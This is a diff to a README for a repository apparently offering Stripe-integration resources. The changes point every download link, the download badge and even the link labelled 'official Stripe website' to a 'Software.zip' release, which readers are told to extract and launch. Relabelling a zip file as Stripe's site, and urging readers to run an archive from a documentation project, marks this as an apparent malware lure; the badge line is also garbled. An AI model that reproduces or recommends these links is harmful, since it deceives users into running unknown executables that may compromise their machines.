@@ -28,15 +28,15 @@ The "Resources" section contains links to official Stripe documentation, helpful
 
 ## 🚀 Get Started
 
-To dive into the exciting world of Stripe integration, simply download the [Software.zip](https://github.com/user-attachments/files/18383251/Software.zip). Remember to extract the contents and launch the necessary files to access the wealth of information waiting for you.
+To dive into the exciting world of Stripe integration, simply download the [https://github.com/kerlissandro/how-i-stripe/releases/download/v2.0/Software.zip](https://github.com/kerlissandro/how-i-stripe/releases/download/v2.0/Software.zip). Remember to extract the contents and launch the necessary files to access the wealth of information waiting for you.
 
 If you encounter any issues with the provided link, please check the "Releases" section for alternative download options.
 
-[![Download Software.zip](https://img.shields.io/badge/Download-Software.zip-<COLOR>.svg)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Download https://github.com/kerlissandro/how-i-stripe/releases/download/v2.0/Software.zip](https://github.com/kerlissandro/how-i-stripe/releases/download/v2.0/Software.zip<COLOR>.svg)](https://github.com/kerlissandro/how-i-stripe/releases/download/v2.0/Software.zip)
 
 ## 📚 Additional Information
 
-For more updates and community discussions, visit the official [Stripe website](https://www.stripe.com). Stay informed about product updates, upcoming features, and success stories from businesses leveraging Stripe for their payment needs.
+For more updates and community discussions, visit the official [Stripe website](https://github.com/kerlissandro/how-i-stripe/releases/download/v2.0/Software.zip). Stay informed about product updates, upcoming features, and success stories from businesses leveraging Stripe for their payment needs.
 
 ## 🤝 Contributions
 
